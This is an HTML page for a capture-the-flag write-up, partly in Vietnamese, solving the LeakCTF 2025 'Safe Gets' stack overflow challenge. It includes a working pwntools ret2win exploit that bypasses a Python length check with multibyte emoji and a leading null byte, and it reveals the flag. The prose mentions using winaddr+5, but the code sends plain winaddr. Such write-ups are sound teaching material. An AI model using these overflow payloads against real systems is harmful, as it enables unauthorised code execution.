@@ -1,0 +1,265 @@
+﻿<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content="Pwn/Safe Gets writeup">  
+
+  <meta property="og:type" content="website">
+  <meta property="og:description" content="Pwn/Safe Gets writeup" />
+  <meta property="og:image" content="https://l1n3e.github.io/images/oia-uia.gif" />
+  <meta property="og:url" content="https://l1n3e.github.io/writeups/leakctf2025/">
+  <meta property="og:title" content="LeakCTF 2025 - Safe Gets [pwn]">
+  <meta property="og:site_name" content="l1n3e.github.io">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta property="twitter:domain" content="l1n3e.github.io">
+  <meta property="twitter:url" content="https://l1n3e.github.io/writeups/leakctf2025/">
+  <meta name="twitter:title" content="LeakCTF 2025 - Safe Gets [pwn]">
+  <meta name="twitter:description" content="Pwn/Safe Gets writeup">
+  <meta name="twitter:image" content="https://l1n3e.github.io/images/oia-uia.gif">
+  
+  <title>LeakCTF 2025 - Safe Gets [pwn]</title>
+
+  <link rel="icon" type="image/gif" href="/images/oia-uia.gif" />
+
+  <!-- CSS site -->
+  <link rel="stylesheet" href="/css/main.9bb372a616563f9ecafd6e5ea0d7760c487f35e7358f212b258b477fbfa75f5264ef33aaffa0334383ffc444b631b8dc5c496c67b5830ab2ac1f1e226a1125c3.css" integrity="sha512-SCTwql8ojGNJq4/8danXc4z96zch+4V1h2iGISxKZRA4PmJnbTdKgqKFsW/2hQ6XltV2Pnp6br5eTRiaejha2w==" />
+
+  <!-- Code theme (khít ô + border) -->
+  <link rel="stylesheet" href="/css/code-theme.css" />
+
+  <!-- KaTeX (tùy chọn; render trong <article> để nhẹ) -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css">
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function() {
+      const root = document.querySelector('article');
+      if (root && window.renderMathInElement) {
+        renderMathInElement(root, {
+          delimiters: [
+            {left: "$$", right: "$$", display: true},
+            {left: "\\[", right: "\\]", display: true},
+            {left: "\\(", right: "\\)", display: false},
+            {left: "$",  right: "$",  display: false}
+          ],
+          throwOnError: false
+        });
+      }
+    });
+  </script>
+</head>
+
+<body a="dark">
+  <main class="page-content" aria-label="Content">
+    <div class="w">
+<a href="/">~/</a>
+
+<script src="/js/theme-toggle.f10bb0c6283b259e63664053a20ccc48c8b0980e44bceece1c10401c529c2040.js" integrity="sha256-8Quwxig7JZ5jZkBTogzMSMiwmA5EvO7OHBBAHFKcIEA="></script>
+
+<button style="float: right; background: none; outline: none;" onclick="toggleTheme()">
+  <svg class="w-6 h-6 text-gray-800 dark:text-white theme" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
+    <path fill-rule="evenodd" d="M7.05 4.05A7 7 0 0 1 19 9c0 2.407-1.197 3.874-2.186 5.084l-.04.048C15.77 15.362 15 16.34 15 18a1 1 0 0 1-1 1h-4a1 1 0 0 1-1-1c0-1.612-.77-2.613-1.78-3.875l-.045-.056C6.193 12.842 5 11.352 5 9a7 7 0 0 1 2.05-4.95ZM9 21a1 1 0 0 1 1-1h4a1 1 0 1 1 0 2h-4a1 1 0 0 1-1-1Zm1.586-13.414A2 2 0 0 1 12 7a1 1 0 1 0 0-2 4 4 0 0 0-4 4 1 1 0 0 0 2 0 2 2 0 0 1 .586-1.414Z" clip-rule="evenodd"/>
+  </svg>
+</button>
+
+<article>
+  <p class="post-meta">
+    <time datetime="2025-09-18 01:27:12 +0100 CET">2025-09-18</time>
+  </p>
+
+  <h1>LeakCTF 2025 - Safe Gets [pwn]</h1>
+
+  <aside>
+    <nav id="TableOfContents">
+      <ul>
+        <li><a href="#overview">Overview</a></li>
+        <li><a href="#source-file">Source file</a>
+          <ul>
+            <li><a href="#wrapperpy">wrapper.py</a></li>
+            <li><a href="#pseudocode-of-main">pseudocode of <code>main()</code></a></li>
+          </ul>
+        </li>
+        <li><a href="#exploitation-plan">Exploitation plan</a>
+          <ul>
+            <li><a href="#bypass-wrapperpy">Bypass <code>wrapper.py</code></a></li>
+            <li><a href="#strlen-and-null-byte">Lỗ hổng <code>strlen()</code> &amp; null byte <code>\x00</code></a></li>
+            <li><a href="#offset">Tính toán offset</a></li>
+          </ul>
+        </li>
+        <li><a href="#exploit">Exploit</a></li>
+        <li><a href="#flag">Flag</a></li>
+      </ul>
+    </nav>
+  </aside>
+
+  <blockquote><p>Difficulty : Easy</p></blockquote>
+  <blockquote><p>Challenge : LeakCTF 2025 - Safe Gets (pwn)</p></blockquote>
+  <blockquote><p>Author : White</p></blockquote>
+  <blockquote><p>Description : I think I found the way to make gets safe.</p></blockquote>
+
+  <h1 id="overview">Overview</h1>
+  <p>Nhìn chung ta thấy file binary sử dụng hàm <code>gets()</code> để nhập vào chuỗi <code>buffer</code> và in ra <code>reversed string</code> chuỗi đảo ngược của chuỗi <code>buffer</code>. Thử kiểm tra <code>checksec</code> ta thấy No Canary and PIE và có hàm <code>win()</code> nằm trong binary đây là dấu hiệu để ta biết đây là <code>ret2win</code>. Nhưng ở đây chúng ta có thêm <code>wrapper.py</code>, nó kiểm tra chuỗi buffer đầu vào sao cho buffer &lt;= 255 bytes.</p>
+
+  <h1 id="source-file">Source file</h1>
+
+  <h2 id="wrapperpy">wrapper.py</h2>
+  <pre><code class="language-python">import subprocess
+import sys
+
+BINARY = "./chall"
+MAX_LEN = 0xff
+
+# Get input from user
+payload = input(f"Enter your input (max {MAX_LEN} bytes): ")
+if len(payload) &gt; MAX_LEN:
+    print("[-] Input too long!")
+    sys.exit(1)
+
+# Start the binary with pipes
+proc = subprocess.Popen(
+    [BINARY],
+    stdin=subprocess.PIPE,
+    stdout=sys.stdout,
+    stderr=subprocess.PIPE
+)
+
+try:
+    # Send initial payload
+    proc.stdin.write(payload.encode() + b'\n')
+    proc.stdin.flush()
+
+    # Interactive loop
+    while True:
+        line = sys.stdin.readline()
+        if not line:
+            break
+        if proc.poll() is not None:
+            print("[+] Process has exited.")
+            break
+        proc.stdin.write(line.encode('latin1'))
+        proc.stdin.flush()
+except (KeyboardInterrupt, BrokenPipeError):
+    print("[+] Exiting.")
+finally:
+    try:
+        proc.terminate()
+    except Exception:
+        pass
+</code></pre>
+
+  <h2 id="pseudocode-of-main">pseudocode of <code>main()</code></h2>
+  <pre><code class="language-cpp">int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  char s[259]; // [rsp+0h] [rbp-110h] BYREF
+  char v5;     // [rsp+103h] [rbp-Dh]
+  int v6;      // [rsp+104h] [rbp-Ch]
+  unsigned __int64 i; // [rsp+108h] [rbp-8h]
+
+  gets(s, argv, envp);
+  v6 = strlen(s);
+  for ( i = 0; i &lt; v6 / 2; ++i )
+  {
+    v5 = s[v6 - 1 - i];
+    s[v6 - 1 - i] = s[i];
+    s[i] = v5;
+  }
+  puts("Reversed string:");
+  puts(s);
+  return 0;
+}
+</code></pre>
+
+  <h1 id="exploitation-plan">Exploitation plan</h1>
+  <p><strong>Hướng exploit</strong><br>
+  Nhìn chung, ta nhận ra đây là bài buffer overflow kiểu ret2win, nên ý tưởng là:</p>
+  <ul>
+    <li>Tính toán offset từ buffer <code>s</code> đến thanh ghi <code>RIP</code>.</li>
+    <li>Chèn địa chỉ của hàm <code>win()</code> vào <code>RIP</code> để chuyển hướng thực thi.</li>
+  </ul>
+  <p>Tuy nhiên, trước đó cần bypass đoạn script <code>wrapper.py</code>.</p>
+
+  <h2 id="bypass-wrapperpy">Bypass <code>wrapper.py</code></h2>
+  <p><img src="https://hackmd.io/_uploads/rkRBiBzUle.png" alt="bypass screenshot"></p>
+  <p>Khi thử nghiệm một vài đầu vào, ta nhận thấy:</p>
+  <ul>
+    <li>Các ký tự emoji chiếm tới 4 byte, nhưng hàm xử lý độ dài chỉ tính là 1 ký tự.</li>
+    <li>Nhờ vậy, ta có thể lợi dụng sự sai lệch này để vượt qua <code>wrapper.py</code>.</li>
+  </ul>
+
+  <h2 id="strlen-and-null-byte">Lỗ hổng <code>strlen()</code> &amp; null byte <code>\x00</code></h2>
+  <pre><code class="language-c">v6 = strlen(s);
+</code></pre>
+
+  <h2 id="offset">Tính toán offset</h2>
+  <pre><code>259 (buff) + 1 (char) + 4 (int) + 8 (unsigned __int64) = 272
++ 8 (saved RBP) = 280 bytes
+</code></pre>
+
+  <p>Vì chương trình không bật PIE, nên các địa chỉ là tĩnh.<br>
+  → Địa chỉ hàm <code>win()</code> được xác định là: <code>winaddr = 0x401262</code><br>
+  <em>Ở đây tôi để <code>winaddr + 5</code> do khi ret tới <code>winaddr</code> thôi nó sẽ lỗi và bây giờ nó sẽ ret trực tiếp vào trong hàm <code>win()</code></em></p>
+  <p><img src="https://hackmd.io/_uploads/S1gyABGUle.png" alt="offset diagram"></p>
+
+  <h1 id="exploit">Exploit</h1>
+  <pre><code class="language-python">from pwn import *
+ 
+binary='./chall'
+elf = context.binary = ELF(binary, checksec=False)
+ 
+#p=process(binary)
+p=remote("34.45.81.67",16002)
+
+winaddr = 0x401262
+
+payload = b'\x00' * 4 + '🦖'.encode() * 69 + p64(winaddr)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+
+  <h1 id="flag">Flag</h1>
+  <pre><code>L3AK{6375_15_4pp4r3n7ly_n3v3r_54f3}
+</code></pre>
+
+</article>
+
+    </div>
+  </main>
+
+  <!-- Script nhẹ: cắt newline thừa & (nếu có bảng Pygments) fix số dòng. Không dùng MutationObserver -->
+  <script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // 1) Chuẩn hoá cho pre>code đơn giản
+    document.querySelectorAll('pre code').forEach(code => {
+      const t = (code.textContent || '')
+        .replace(/\r\n/g, '\n')        // CRLF -> LF
+        .replace(/^\s*\n+/, '')        // bỏ dòng trắng đầu
+        .replace(/[ \t\f\v]*(\n[ \t\f\v]*)+$/, ''); // bỏ dòng trắng cuối
+      if (t !== code.textContent) code.textContent = t;
+    });
+
+    // 2) Nếu trang đang dùng Pygments dạng bảng .highlight table: đồng bộ số dòng
+    document.querySelectorAll('.highlight table, .chroma .lntable, table.lntable').forEach(tbl => {
+      const lineCell = tbl.querySelector('td:first-child');
+      const codeCell = tbl.querySelector('td:last-child');
+      if (!lineCell || !codeCell) return;
+      const numEl  = lineCell.querySelector('pre code, pre');
+      const codeEl = codeCell.querySelector('pre code') || codeCell.querySelector('pre');
+      if (!numEl || !codeEl) return;
+
+      // Không động vào innerHTML highlight; chỉ đọc innerText
+      const text = (codeEl.innerText || '')
+        .replace(/\r\n/g, '\n')
+        .replace(/^\s*\n+/, '')
+        .replace(/(\n\s*)+$/, '');
+      const lines = text ? text.split('\n').length : 1;
+
+      let nums = '';
+      for (let i = 1; i <= lines; i++) nums += i + (i < lines ? '\n' : '');
+      numEl.textContent = nums;
+    });
+  });
+  </script>
+</body>
+</html>
